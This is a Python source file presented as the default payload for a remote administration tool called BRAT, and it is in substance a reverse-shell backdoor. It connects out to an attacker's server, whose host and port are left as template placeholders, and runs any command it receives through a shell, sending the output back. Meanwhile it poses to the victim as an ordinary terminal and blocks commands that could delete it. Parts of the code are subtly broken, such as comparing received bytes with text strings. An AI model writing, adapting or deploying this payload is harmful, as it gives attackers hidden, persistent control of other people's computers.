
# Name: Default payload from BRAT.

# Detection risk: High
# Persistent: Yes

# Description: This payload is the default for BRAT (Basic Remote Administration Tool).
# This payload when executed, tries to connect to the server (Attacker), if cannot
# connect, then retry. If connected, then the attacker will have full access to it.
# Meanwhile, it looks like a normal terminal to the user. The user can execute commands
# like on a normal computer, but he cannot execute commands with characters '*', or '.',
# or even the payload's filename, meaning the user cannot delete the payload. But, it is
# still possible to delete it. For example, the user can change directory to '..', and
# then delete the directory. More methods are availabe to delete payload. Another way is
# to create a script to delete the payload.

import socket
import subprocess
import os
import sys
try:
    import multitasking

except:
    while True:
        try:
            os.system('pip install multitasking')
            import multitasking
            break

        except:
            continue

s = socket.socket()
n = '\n'
n = n.encode()

def program_restart():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()

def try_connect():
    while True:
        try:
            #print("[i] T6Y1NG 70 C0NN3C7...") # Debug only
            s.connect(('{}', {}))
            break

        except ConnectionRefusedError:
            pass

        except:
            pass

@multitasking.task
def main():
    try_connect()
    rplatform = sys.platform.encode()
    rpayload_name = sys.argv[0].encode()
    s.sendall(rplatform)
    s.recv(16)
    s.sendall(rpayload_name)
    while True:
        try:
            #print("[i] W3 463 N0W C0NN3C73D 70 7H3 S36V36!") # Debug only
            cmd = s.recv(100000)
            if cmd[:2] == 'cd':
                os.chdir(cmd[3:])
                dir = os.getcwd()
                s.sendall('bacod')

            else:
                results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results = results.stdout.read() + results.stderr.read()
                try:
                    s.sendall(n+results)

                except:
                    program_restart()

        except(BrokenPipeError, OSError):
            program_restart()

        except:
            program_restart()

if sys.platform == 'nt':
    os.system('cls')

else:
    os.system('clear')

while True:
    try:
        main()
        front = input("$ ")
        if sys.argv[0] in front or '*' in front or '.' in front:
            continue

        else:
            os.system(front)

    except:
        continue
